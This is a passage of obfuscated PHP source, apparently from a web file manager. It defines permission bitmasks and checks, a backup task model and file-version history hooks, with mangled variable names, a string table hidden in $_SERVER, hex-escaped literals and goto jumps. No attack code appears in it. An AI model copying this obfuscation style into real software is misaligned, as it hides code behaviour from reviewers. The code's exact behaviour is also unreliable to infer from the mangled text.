$ùÏô¡”€ - @disk_free_space($˜†’ìÍ•); return array($ºµ‡§[1984] => $ùÏô¡”€, $ºµ‡§[1986] => $Ş¸€í»í); } public function fileChart($Œ¾Ş¢ğü) { $®µ¼ëù¨ =& $_SERVER[ùèÅ´Ãš]; if (isset($Œ¾Ş¢ğü[$®µ¼ëù¨[1797]])) { return Model($®µ¼ëù¨[908])->userFileTypeProfile($Œ¾Ş¢ğü[$®µ¼ëù¨[1797]]); } if (isset($Œ¾Ş¢ğü[$®µ¼ëù¨[1404]])) { return Model($®µ¼ëù¨[908])->groupFileTypeProfile($Œ¾Ş¢ğü[$®µ¼ëù¨[1404]]); } $”Ÿ€“÷è = $this->sourceSize(); $Ñ‹ïĞîè = array($®µ¼ëù¨[193] => 0, $®µ¼ëù¨[191] => 1); $­§‘Â´ = Model($®µ¼ëù¨[908])->where($Ñ‹ïĞîè)->sum($®µ¼ëù¨[79]); $Ñ‹ïĞîè[$®µ¼ëù¨[191]] = 2; $àà„Œ¿‚ = Model($®µ¼ëù¨[908])->where($Ñ‹ïĞîè)->sum($®µ¼ëù¨[79]); return array($®µ¼ëù¨[841] => $”Ÿ€“÷è[$®µ¼ëù¨[79]], $®µ¼ëù¨[1932] => $”Ÿ€“÷è[$®µ¼ëù¨[1932]], $®µ¼ëù¨[1933] => (int) $­§‘Â´, $®µ¼ëù¨[1934] => (int) $àà„Œ¿‚); } private function sourceSize() { $ª×áÛ²¸ =& $_SERVER[ùèÅ´Ãš]; $†”ç° ² = Model($ª×áÛ²¸[908])->where(array($ª×áÛ²¸[487] => 0))->sum($ª×áÛ²¸[79]); $êëàªÉ = Model($ª×áÛ²¸[548])->sum($ª×áÛ²¸[79]); if ($êëàªÉ > $†”ç° ²) { $êëàªÉ = $†”ç° ²; } return array($ª×áÛ²¸[79] => (int) $†”ç° ², $ª×áÛ²¸[1932] => (int) $êëàªÉ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $øòÕ„²û =& $_SERVER[ùèÅ´Ãš]; $Ş€Êì­á = array(array($øòÕ„²û[496] => LNG($øòÕ„²û[1998]), $øòÕ„²û[1999] => $øòÕ„²û[2000], $øòÕ„²û[2001] => 1, $øòÕ„²û[2002] => 1, $øòÕ„²û[2003] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($øòÕ„²û[496] => LNG($øòÕ„²û[2004]), $øòÕ„²û[1999] => $øòÕ„²û[2005], $øòÕ„²û[2001] => 2, $øòÕ„²û[2002] => 1, $øòÕ„²û[2003] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($øòÕ„²û[496] => LNG($øòÕ„²û[2006]), $øòÕ„²û[1999] => $øòÕ„²û[2007], $øòÕ„²û[2001] => 3, $øòÕ„²û[2002] => 1, $øòÕ„²û[2003] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($øòÕ„²û[496] => LNG($øòÕ„²û[2008]), $øòÕ„²û[1999] => $øòÕ„²û[2009], $øòÕ„²û[2001] => 4, $øòÕ„²û[2002] => 1, $øòÕ„²û[2003] => self::AUTH_SHOW | self::AUTH_VIEW), array($øòÕ„²û[496] => LNG($øòÕ„²û[2010]), $øòÕ„²û[1999] => $øòÕ„²û[2011], $øòÕ„²û[2001] => 5, $øòÕ„²û[2002] => 1, $øòÕ„²û[2003] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($øòÕ„²û[496] => LNG($øòÕ„²û[2012]), $øòÕ„²û[1999] => $øòÕ„²û[2013], $øòÕ„²û[2001] => 6, $øòÕ„²û[2002] => 1, $øòÕ„²û[2003] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($øòÕ„²û[496] => LNG($øòÕ„²û[2014]), $øòÕ„²û[1999] => $øòÕ„²û[2015], $øòÕ„²û[2001] => 7, $øòÕ„²û[2002] => 1, $øòÕ„²û[2003] => 0)); return $Ş€Êì­á; } public static function authCheck($Ü’áüğ´, $Œû»¡ê¢) { $«Ø¶ç‘ =& $_SERVER[ùèÅ´Ãš]; $Ü’áüğ´ = intval($Ü’áüğ´); if (KodUser::isRoot() && $GLOBALS[$«Ø¶ç‘[6]][$«Ø¶ç‘[2016]]) { return !0; } if ($Ü’áüğ´ <= 0) { return !1; } if (($Ü’áüğ´ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ü’áüğ´ & $Œû»¡ê¢); } public static function authCheckShow($‰üÓ¥™) { return self::authCheck($‰üÓ¥™, self::AUTH_SHOW); } public static function authCheckView($öä¿­ºğ) { return self::authCheck($öä¿­ºğ, self::AUTH_VIEW); } public static function authCheckDownload($ƒâ­óé¦) { return self::authCheck($ƒâ­óé¦, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Ê‚ÍÛÚ) { return self::authCheck($Ê‚ÍÛÚ, self::AUTH_UPLOAD); } public static function authCheckEdit($î¼Óò€”) { return self::authCheck($î¼Óò€”, self::AUTH_EDIT); } public static function authCheckRemove($ï¹şĞ©) { return self::authCheck($ï¹şĞ©, self::AUTH_REMOVE); } public static function authCheckShare($Îƒ™Èß×) { return self::authCheck($Îƒ™Èß×, self::AUTH_SHARE); } public static function authCheckComment($ğê£”«Ö) { return self::authCheck($ğê£”«Ö, self::AUTH_COMMENT); } public static function authCheckEvent($ÖõšË­±) { return self::authCheck($ÖõšË­±, self::AUTH_EVENT); } public static function authCheckRoot($äù’Í¾Ò) { return self::authCheck($äù’Í¾Ò, self::AUTH_ROOT); } public static function authCheckAction($Ø“Á˜Ô, $¿½’×§İ) { $æÎÒ×ôé =& $_SERVER[ùèÅ´Ãš]; $šŒô’Û™ = array($æÎÒ×ôé[2017] => self::AUTH_VIEW, $æÎÒ×ôé[1293] => self::AUTH_DOWNLOAD, $æÎÒ×ôé[110] => self::AUTH_UPLOAD, $æÎÒ×ôé[1967] => self::AUTH_EDIT, $æÎÒ×ôé[1241] => self::AUTH_REMOVE, $æÎÒ×ôé[1977] => self::AUTH_SHARE, $æÎÒ×ôé[431] => self::AUTH_COMMENT, $æÎÒ×ôé[1784] => self::AUTH_EVENT, $æÎÒ×ôé[2018] => self::AUTH_ROOT); if (!isset($šŒô’Û™[$¿½’×§İ])) { return; } $ı¬Ü¿ÜÎ = $šŒô’Û™[$¿½’×§İ]; $Ø“Á˜Ô = intval($Ø“Á˜Ô); if ($Ø“Á˜Ô <= 0) { return !1; } if (($Ø“Á˜Ô & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ø“Á˜Ô & $ı¬Ü¿ÜÎ); } public static function authDisable($ˆ®ˆÚº², $‹®è©Î™) { if (intval($ˆ®ˆÚº²) <= 0) { return 0; } return intval($ˆ®ˆÚº²) & ~$‹®è©Î™; } public $optionType = "\x53\171\163\x74\x65\x6d\56\163\157\x75\162\x63\145\x41\x75\x74\150\114\151\x73\164"; public $field = array("\x6e\141\155\x65", "\141\165\164\150", "\x6c\141\x62\145\x6c", "\x64\151\163\x70\154\141\171", "\163\171\163\x74\x65\x6d", "\163\x6f\162\x74"); public function initData() { $îî’’Ò = $this->authDefault(); foreach ($îî’’Ò as $ø½ä²ğ) { $this->add($ø½ä²ğ); } } public function findAuth($õ³È¤Úè, $º…ÒÔƒ³) { $Â—¬×ÍÂ =& $_SERVER[ùèÅ´Ãš]; $æ†¨«Ÿ… = parent::listData(); foreach ($æ†¨«Ÿ… as $Şß £ë) { $‹İéüÊ = intval($Şß £ë[$Â—¬×ÍÂ[489]]); if ($‹İéüÊ <= 0 || $Şß £ë[$Â—¬×ÍÂ[2019]] == 0) { continue; } if (($‹İéüÊ & $õ³È¤Úè) != $õ³È¤Úè) { continue; } if (($‹İéüÊ & $º…ÒÔƒ³) != 0) { continue; } return $Şß £ë[$Â—¬×ÍÂ[477]]; } return !1; } public function findAuthMax($ª¢½üó, $òåå Ÿø) { $€€É²´¡ =& $_SERVER[ùèÅ´Ãš]; $¥ÓØÖ¦Ç = !1; $£ƒšâ¿Š = parent::listData(); foreach ($£ƒšâ¿Š as $‘±‰öã) { $š×—·÷ = intval($‘±‰öã[$€€É²´¡[489]]); if ($š×—·÷ <= 0 || $‘±‰öã[$€€É²´¡[2019]] == 0) { continue; } if (($š×—·÷ & $ª¢½üó) != $ª¢½üó) { continue; } if (($š×—·÷ & $òåå Ÿø) != 0) { continue; } if (!$¥ÓØÖ¦Ç) { $¥ÓØÖ¦Ç = $‘±‰öã; continue; } if (intval($¥ÓØÖ¦Ç[$€€É²´¡[489]]) < $š×—·÷) { $¥ÓØÖ¦Ç = $‘±‰öã; } } return $¥ÓØÖ¦Ç ? $¥ÓØÖ¦Ç[$€€É²´¡[477]] : !1; } public function findAuthReadOnly() { $– ÁÇ‰Ö = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Œ‡¼â = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($– ÁÇ‰Ö, $Œ‡¼â); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $£•ãÃğ =& $_SERVER[ùèÅ´Ãš]; $êşºœ = parent::listData(); $µÊÏ·¬ = !1; foreach ($êşºœ as $£…ôîù‘) { if ($£…ôîù‘[$£•ãÃğ[489]] <= 0 || $£…ôîù‘[$£•ãÃğ[2019]] == $£•ãÃğ[231]) { continue; } if (!$µÊÏ·¬) { $µÊÏ·¬ = $£…ôîù‘; continue; } if ($µÊÏ·¬[$£•ãÃğ[489]] > $£…ôîù‘[$£•ãÃğ[489]]) { $µÊÏ·¬ = $£…ôîù‘; } } return $µÊÏ·¬ ? $µÊÏ·¬[$£•ãÃğ[477]] : $£•ãÃğ[12]; } public function listData($‹Ÿ­ü—Ë = false, $æ°¹–şÓ = "\x73\x6f\x72\164", $Ó¥Çª‘° = false) { return parent::listData($‹Ÿ­ü—Ë, $æ°¹–şÓ, $Ó¥Çª‘°); } public function update($™ŸÏó†, $Ãıíæ¶) { $™äšìü’ =& $_SERVER[ùèÅ´Ãš]; $ó»é¯Ãİ = parent::listData($™ŸÏó†); $êåü‘øè = $this->findByName($Ãıíæ¶[$™äšìü’[32]]); if (!$ó»é¯Ãİ || $êåü‘øè && $êåü‘øè[$™äšìü’[477]] != $ó»é¯Ãİ[$™äšìü’[477]]) { return !1; } $this->filterAuth($Ãıíæ¶[$™äšìü’[489]]); return parent::update($™ŸÏó†, $Ãıíæ¶); } public function remove($‹Ï¤ÉÖ¥) { $¾ßûÄ± = parent::listData($‹Ï¤ÉÖ¥); if (!$¾ßûÄ± || $¾ßûÄ±[$_SERVER[ùèÅ´Ãš][192]]) { return !1; } return parent::remove($‹Ï¤ÉÖ¥); } public function add($«Æë’ù´ = array()) { $À“´±â‚ =& $_SERVER[ùèÅ´Ãš]; if ($this->findByName($«Æë’ù´[$À“´±â‚[32]])) { return !1; } $Ø¿¸€’¥ = array($À“´±â‚[32] => $À“´±â‚[12], $À“´±â‚[489] => 1, $À“´±â‚[2020] => $À“´±â‚[2007], $À“´±â‚[2019] => 1, $À“´±â‚[192] => 0, $À“´±â‚[2021] => 0); $«Æë’ù´ = array_merge($Ø¿¸€’¥, $«Æë’ù´); $«Æë’ù´[$À“´±â‚[2021]] = $this->getSort(); $this->filterAuth($«Æë’ù´[$À“´±â‚[489]]); return parent::insert($«Æë’ù´); } private function getSort() { $‰©ºµì =& $_SERVER[ùèÅ´Ãš]; $Èùª“ = parent::listData(); $º¬óø¯ = array_to_keyvalue($Èùª“, $‰©ºµì[12], $‰©ºµì[2021]); return empty($º¬óø¯) ? 0 : max($º¬óø¯) + 1; } private function filterAuth(&$öİŸÚÙù) { if (!$öİŸÚÙù) { return; } $ƒéõ·î£ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ğÅÅä = array(); foreach ($ƒéõ·î£ as $Ô›£ÃÉë) { if ($öİŸÚÙù & $Ô›£ÃÉë) { $ğÅÅä[] = $Ô›£ÃÉë; } } if (in_array(self::AUTH_ROOT, $ğÅÅä)) { $öİŸÚÙù = array_sum($ƒéõ·î£); return; } $ÂîĞÅâŞ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ğÅÅä as $Ô›£ÃÉë) { if (isset($ÂîĞÅâŞ[$Ô›£ÃÉë])) { $ğÅÅä = array_merge($ğÅÅä, $ÂîĞÅâŞ[$Ô›£ÃÉë]); } } $ğÅÅä[] = self::AUTH_SHOW; $öİŸÚÙù = array_sum(array_unique($ğÅÅä)); } public function sort($¼·š·Õ, $Á´ˆ¥öñ) { return parent::update($¼·š·Õ, $Á´ˆ¥öñ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\142\x61\143\x6b\165\x70\x4c\151\x73\164"; public $field = array("\x69\157", "\156\141\x6d\145", "\163\x74\141\164\x75\x73", "\143\x6f\156\x74\x65\x6e\x74", "\155\x61\x6e\x75\141\154", "\x72\x65\163\x75\154\x74", "\164\151\155\145\x46\162\x6f\155", "\x74\151\x6d\145\x54\x6f"); public function config() { $³½©áåì =& $_SERVER[ùèÅ´Ãš]; Action($³½©áåì[2022])->taskInit(); $‚ìøĞ©™ = Model($³½©áåì[848])->get($³½©áåì[855]); $‚ìøĞ©™ = json_decode($‚ìøĞ©™, !0); $‚ìøĞ©™ = is_array($‚ìøĞ©™) ? $‚ìøĞ©™ : array(); $this->parseContent($‚ìøĞ©™); unset($‚ìøĞ©™[$³½©áåì[1766]]); Model($³½©áåì[1765])->cacheClear(); $Ÿà¿õìó = $³½©áåì[2023]; $¨­éñ› = Model($³½©áåì[2024])->findByKey($³½©áåì[1784], $Ÿà¿õìó); if (!$¨­éñ›) { $¨­éñ› = array(); } if (isset($¨­éñ›[$³½©áåì[207]])) { $¨­éñ›[$³½©áåì[207]] = json_decode($¨­éñ›[$³½©áåì[207]], !0); } if (isset($‚ìøĞ©™[$³½©áåì[207]])) { $¨­éñ›[$³½©áåì[207]][$³½©áåì[1769]] = $‚ìøĞ©™[$³½©áåì[207]]; unset($‚ìøĞ©™[$³½©áåì[207]]); } return array_merge($¨­éñ›, $‚ìøĞ©™); } public function listData($å®†³úª = false, $ææƒŸªë = "\155\x6f\144\x69\146\x79\124\x69\x6d\145", $àŸ¤…ÌØ = false) { $Õ÷ª¨’ = parent::listData($å®†³úª, $ææƒŸªë, !0); if (!$Õ÷ª¨’) { return $Õ÷ª¨’; } if ($å®†³úª) { $Õ÷ª¨’ = array($Õ÷ª¨’); } foreach ($Õ÷ª¨’ as &$±í«Æ Ä) { $this->parseContent($±í«Æ Ä); } return $å®†³úª ? $Õ÷ª¨’[0] : $Õ÷ª¨’; } public function parseContent(&$Áî¼ÅÑŠ) { $–ÕÏ»µü =& $_SERVER[ùèÅ´Ãš]; $…„øº¼ = _get($Áî¼ÅÑŠ, $–ÕÏ»µü[171], $–ÕÏ»µü[91]); if (!in_array($…„øº¼, array($–ÕÏ»µü[854], $–ÕÏ»µü[1220]))) { $Áî¼ÅÑŠ[$–ÕÏ»µü[171]] = $…„øº¼ == $–ÕÏ»µü[91] ? $–ÕÏ»µü[1220] : $–ÕÏ»µü[854]; } } public function lastItem() { $ÂÏÑ²î” = $this->listData(); return !empty($ÂÏÑ²î”[0]) ? $ÂÏÑ²î”[0] : null; } public function kill($‰çƒ½ƒ°) { $ ’¯«ıç =& $_SERVER[ùèÅ´Ãš]; $üÜ’›¸ß = $this->listData($‰çƒ½ƒ°); if (!$üÜ’›¸ß || empty($üÜ’›¸ß[$ ’¯«ıç[32]])) { return !0; } Task::kill($ ’¯«ıç[863]); Task::kill($ ’¯«ıç[882]); Task::kill($ ’¯«ıç[892]); $ÓÙ»·Ø² = $üÜ’›¸ß[$ ’¯«ıç[32]]; $°œÖëè‰ = TEMP_FILES . $ ’¯«ıç[858] . $ÓÙ»·Ø² . $ ’¯«ıç[8]; IO::remove($°œÖëè‰, !1); return $this->remove($‰çƒ½ƒ°); } public function remove($•³ú¤õ²) { $ÆÀ¬•Ä = $this->listData($•³ú¤õ²); if (!$ÆÀ¬•Ä) { return !0; } return $this->backupRemove($ÆÀ¬•Ä); } private function backupRemove($çİÕ†ıÎ) { parent::remove($çİÕ†ıÎ[$_SERVER[ùèÅ´Ãš][477]]); $±ÅğÙ…Á = $this->backupPath($çİÕ†ıÎ); IO::remove($±ÅğÙ…Á, !1); return !0; } private function backupPath($ôì•©ã) { $û”ÀñÙ =& $_SERVER[ùèÅ´Ãš]; $ÙÎ¦Çç’ = $ôì•©ã[$û”ÀñÙ[32]]; $È»û³« = Model($û”ÀñÙ[848])->get($û”ÀñÙ[849]); $ÀäÉ‹„Ê = substr(md5($û”ÀñÙ[850] . $È»û³« . $ÙÎ¦Çç’), 0, 8); return "\x7b\151\157\x3a{$ôì•©ã[$û”ÀñÙ[829]]}\x7d\x2f\144\x61\164\x61\x62\141\x73\x65\57\142\x61\143\x6b\165\x70\57" . $ÙÎ¦Çç’ . $û”ÀñÙ[11] . $ÀäÉ‹„Ê; } public function start() { $¹Òğ–ß =& $_SERVER[ùèÅ´Ãš]; if ($GLOBALS[$¹Òğ–ß[6]][$¹Òğ–ß[92]][$¹Òğ–ß[2025]] != $¹Òğ–ß[91]) { return !0; } $ÈÄçˆ¬ = $this->config(); if (!$ÈÄçˆ¬ || $ÈÄçˆ¬[$¹Òğ–ß[1766]] != $¹Òğ–ß[91]) { return !1; } if ($ÈÄçˆ¬[$¹Òğ–ß[171]] == $¹Òğ–ß[854]) { $şÚ»§°ô = Model($¹Òğ–ß[848])->get($¹Òğ–ß[1338]); if ($şÚ»§°ô == $¹Òğ–ß[1339]) { $ÈÄçˆ¬[$¹Òğ–ß[171]] = $¹Òğ–ß[1220]; } } $Œ»¼ÈüÎ = $this->process(); foreach ($Œ»¼ÈüÎ as $„‚â•óê) { if ($„‚â•óê) { return Task::restart($„‚â•óê[$¹Òğ–ß[477]]); } } $İ³Ö»Œ = new Backup(); $‘­§ô– = $İ³Ö»Œ->db(); if ($‘­§ô–) { $‘­§ô– = $İ³Ö»Œ->dbFile(); if ($‘­§ô– && $ÈÄçˆ¬[$¹Òğ–ß[171]] == $¹Òğ–ß[854]) { $‘­§ô– = $İ³Ö»Œ->file(); } } Backup::set(array($¹Òğ–ß[827] => 1, $¹Òğ–ß[839] => time())); return !0; } public function process() { $¨ÄÏáÜŸ =& $_SERVER[ùèÅ´Ãš]; $ŠšßøŠë = array($¨ÄÏáÜŸ[835] => Task::get($¨ÄÏáÜŸ[863]), $¨ÄÏáÜŸ[840] => Task::get($¨ÄÏáÜŸ[882]), $¨ÄÏáÜŸ[233] => Task::get($¨ÄÏáÜŸ[892])); $”‹ÌÀ–‘ = !1; foreach ($ŠšßøŠë as &$½´†˜¥õ) { if ($”‹ÌÀ–‘) { $½´†˜¥õ = !1; continue; } if ($½´†˜¥õ) { $¦®¥²ì® = intval(_get($½´†˜¥õ, $¨ÄÏáÜŸ[1802], 0)); if (time() - $¦®¥²ì® > 7200) { Task::kill($½´†˜¥õ[$¨ÄÏáÜŸ[477]]); $”‹ÌÀ–‘ = !0; $½´†˜¥õ = !1; } } } return $ŠšßøŠë; } public function restore() { $Ôõ‘­÷ =& $_SERVER[ùèÅ´Ãš]; ActionCall($Ôõ‘­÷[1148], !0, 1); ActionCall($Ôõ‘­÷[1148], !0, 0); } } goto e†õä¾›„Ú; Eå³çËä‰æ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¢ëÃØğ¼ =& $_SERVER[ùèÅ´Ãš]; $ÚóÅ‚„İ = $GLOBALS[$¢ëÃØğ¼[6]][$¢ëÃØğ¼[92]]; if ($ÚóÅ‚„İ[$¢ëÃØğ¼[1315]] != 1) { return; } if ($ÚóÅ‚„İ[$¢ëÃØğ¼[1316]] <= 0) { return; } if (isset($_REQUEST[$¢ëÃØğ¼[1317]]) && $_REQUEST[$¢ëÃØğ¼[1317]] == $¢ëÃØğ¼[91]) { return; } Hook::bind($¢ëÃØğ¼[1318], $¢ëÃØğ¼[1319]); Hook::bind($¢ëÃØğ¼[1320], $¢ëÃØğ¼[1321]); Hook::bind($¢ëÃØğ¼[1322], $¢ëÃØğ¼[1323]); Hook::bind($¢ëÃØğ¼[1324], $¢ëÃØğ¼[1325]); Hook::bind($¢ëÃØğ¼[1326], $¢ëÃØğ¼[1327]); Hook::bind($¢ëÃØğ¼[1328], $¢ëÃØğ¼[1329]); } public static function eventBeforeUpload($Ë©Šì…™) { if ($Ë©Šì…™[3] && $Ë©Šì…™[3] != REPEAT_REPLACE) { return; } $ÓŸªÙ = self::parsePath($Ë©Šì…™[0]); if (!$ÓŸªÙ) { return; } self::add($ÓŸªÙ); } public static function eventBeforeEdit($È¼ êÜü) { $Àö€‰¼ = self::parsePath($È¼ êÜü[0]); if (!$Àö€‰¼) { return; } self::add($Àö€‰¼); } public static function eventBeforeCopyFile($Ùû«³õ°, $‘Ô¬íş©, $Œá²‚îî, $ÚµËÄä¬, $èæÓ‘Àó, $•àŒåí) { $…å§æ¬µ =& $_SERVER[ùèÅ´Ãš]; if (isset($Œá²‚îî->_data[$…å§æ¬µ[1248]]) && $Œá²‚îî->_data[$…å§æ¬µ[1248]]) { return; } $Äš‡Ï† = $Œá²‚îî->getPathOuter($ÚµËÄä¬); $•÷À • = self::parsePath($Äš‡Ï†); if (!$•÷À •) { return; } self::add($•÷À •); } public static function eventBeforeRename($ÃÜñºè) { $†à³ôÃ€ =& $_SERVER[ùèÅ´Ãš]; $Ô¨º¥å = self::parsePath($ÃÜñºè[0]); if (!$Ô¨º¥å) { return; } $ßğíÜÍ = self::checkInHistory($Ô¨º¥å); if (!$ßğíÜÍ) { return; } if ($ßğíÜÍ[$†à³ôÃ€[33]] == $†à³ôÃ€[233]) { $ß¶‘Ğï£ = self::listData($Ô¨º¥å); if ($ß¶‘Ğï£ && $ß¶‘Ğï£[$†à³ôÃ€[447]]) { self::moveHistory($Ô¨º¥å, $ÃÜñºè[1]); } } else { IO::rename($ßğíÜÍ[$†à³ôÃ€[87]], $ÃÜñºè[1]); } } public static function eventBeforeMove($¸¡Ô÷ÃÏ) { $³Ïñ Ÿ¼ =& $_SERVER[ùèÅ´Ãš]; $ƒ®µÈ€û = self::parsePath($¸¡Ô÷ÃÏ[0]); if (!$ƒ®µÈ€û) { return; } $°ËĞÆÆ = self::parsePath($¸¡Ô÷ÃÏ[1]); if (!$°ËĞÆÆ) { return; } $ˆµàÖˆ“ = $¸¡Ô÷ÃÏ[3]; $Ù²·¼ğ = self::checkInHistory($ƒ®µÈ€û); if (!$Ù²·¼ğ) { return; } $¦úß×Êî = self::pathHistory($°ËĞÆÆ); if ($Ù²·¼ğ[$³Ïñ Ÿ¼[33]] == $³Ïñ Ÿ¼[233]) { $ÑÙ¢İ®è = self::listData($ƒ®µÈ€û); $±‚¢µøˆ = rtrim($°ËĞÆÆ, $³Ïñ Ÿ¼[8]) . $³Ïñ Ÿ¼[8] . ($ˆµàÖˆ“ ? $ˆµàÖˆ“ : get_path_this($ƒ®µÈ€û)); $¸²¡²Ä¾ = self::listData($±‚¢µøˆ); if ($ÑÙ¢İ®è && $ÑÙ¢İ®è[$³Ïñ Ÿ¼[447]] && $¸²¡²Ä¾ && $¸²¡²Ä¾[$³Ïñ Ÿ¼[447]]) { return self::clear($ƒ®µÈ€û); } if ($ÑÙ¢İ®è && $ÑÙ¢İ®è[$³Ïñ Ÿ¼[447]]) { self::moveHistory($ƒ®µÈ€û, $ˆµàÖˆ“, $¦úß×Êî); } } else { IO::move($Ù²·¼ğ[$³Ïñ Ÿ¼[87]], $¦úß×Êî, !1, $ˆµàÖˆ“); self::clearEmptyFolder(IO::pathFather($Ù²·¼ğ[$³Ïñ Ÿ¼[87]])); } } public static function eventAfterRemove($ÒÁœò¤, $áƒÌĞ–‰) { $òÖè¦Ú =& $_SERVER[ùèÅ´Ãš]; if (!$áƒÌĞ–‰) { return; } $‡“Á¡ê = self::parsePath($ÒÁœò¤[0]); if (!$‡“Á¡ê) { return; } $ûã¶Ä¤õ = self::checkInHistory($‡“Á¡ê); if (!$ûã¶Ä¤õ) { return; } if ($ûã¶Ä¤õ[$òÖè¦Ú[33]] == $òÖè¦Ú[233]) { $Õşø¸í¸ = self::listData($‡“Á¡ê, !1); if ($Õşø¸í¸ && $Õşø¸í¸[$òÖè¦Ú[447]]) { self::clear($‡“Á¡ê, !1); } } else { IO::remove($ûã¶Ä¤õ[$òÖè¦Ú[87]]); self::clearEmptyFolder(IO::pathFather($ûã¶Ä¤õ[$òÖè¦Ú[87]])); } } private static function checkInHistory($â¥Á—åü) { $»óğ = self::pathHistory($â¥Á—åü); if (!IO::exist($»óğ)) { $»óğ .= $_SERVER[ùèÅ´Ãš][1330]; } return IO::exist($»óğ) ? IO::info($»óğ) : !1; } private static function parsePath($Õ©ş€‡£) { $‹çÀ†Š =& $_SERVER[ùèÅ´Ãš]; if (!$Õ©ş€‡£) { return !1; } if (isset($GLOBALS[$‹çÀ†Š[1331]]) && $GLOBALS[$‹çÀ†Š[1331]]) { return; } $Âß¶àá = KodIO::parse($Õ©ş€‡£); $Ğş±Óßë = $Âß¶àá[$‹çÀ†Š[33]]; $«ÖØ¦Ã² = !$Ğş±Óßë || $Ğş±Óßë == KodIO::KOD_IO || $Ğş±Óßë == KodIO::KOD_SHARE_ITEM; if (!$«ÖØ¦Ã² || !$Âß¶àá[$‹çÀ†Š[1332]]) { return !1; } if (substr($Õ©ş€‡£, 0, strlen(DATA_PATH . $‹çÀ†Š[1333])) == DATA_PATH . $‹çÀ†Š[1333]) { return !1; } if ($Ğş±Óßë == KodIO::KOD_SHARE_ITEM) { $Ñ¬Æ£™î = IO::init($Õ©ş€‡£); if ($Ñ¬Æ£™î->pathParse[$‹çÀ†Š[1244]]) { return self::parsePath($Ñ¬Æ£™î->pathParse[$‹çÀ†Š[1244]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $›ÊÜ¬à = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $‹çÀ†Š[1334]); foreach ($›ÊÜ¬à as $Ÿ“ü¼–) { if (!$Ğş±Óßë && substr($Õ©ş€‡£, 0, strlen($Ÿ“ü¼–)) == $Ÿ“ü¼–) { return !1; } } self::log($GLOBALS[$‹çÀ†Š[1238]] . $‹çÀ†Š[1335] . $Õ©ş€‡£); return $Õ©ş€‡£; } private static function pathHistory($Ç‘ôÕŸ†) { $­§äåŞİ =& $_SERVER[ùèÅ´Ãš]; $†°‹şëÚ = self::$_historyBase . ltrim(KodIO::clear($Ç‘ôÕŸ†), $­§äåŞİ[8]); $†°‹şëÚ = str_replace(array($­§äåŞİ[1336]), array($­§äåŞİ[1337]), $†°‹şëÚ); return $†°‹şëÚ; } public static function log($ÔÔİÖÁĞ) { } public static function historyCount($Ëë©ªŠ) { $¢ç‹²¶ =& $_SERVER[ùèÅ´Ãš]; $ø¬¤ñÃ³ = array(); $–òÚíÛ = array(); foreach ($Ëë©ªŠ as $´»š¯ïş) { $¨¬š—œ = get_path_father($´»š¯ïş); if (!$–òÚíÛ[$¨¬š—œ]) { $–òÚíÛ[$¨¬š—œ] = array(); } $–òÚíÛ[$¨¬š—œ][] = get_path_this($´»š¯ïş); } foreach ($–òÚíÛ as $¨¬š—œ => $÷ÔôƒØÊ) { $¦­Ç·ï³ = self::parsePath($¨¬š—œ); if (!$¦­Ç·ï³) { continue; } foreach ($÷ÔôƒØÊ as $€Í¿Øíã) { $ÙÁáªï = self::listData(rtrim($¦­Ç·ï³, $¢ç‹²¶[8]) . $¢ç‹²¶[8] . $€Í¿Øíã, !1); if ($ÙÁáªï && $ÙÁáªï[$¢ç‹²¶[447]]) { $ø¬¤ñÃ³[rtrim($¨¬š—œ, $¢ç‹²¶[8]) . $¢ç‹²¶[8] . $€Í¿Øíã] = count($ÙÁáªï[$¢ç‹²¶[447]]); } } } return $ø¬¤ñÃ³; } public static function add($¤ìÖÇé¡) { $ÑÍùš÷ì =& $_SERVER[ùèÅ´Ãš]; $­½“•Ôı = self::listData($¤ìÖÇé¡); if (!$­½“•Ôı) { return; } $Ô÷ï¤‰í = 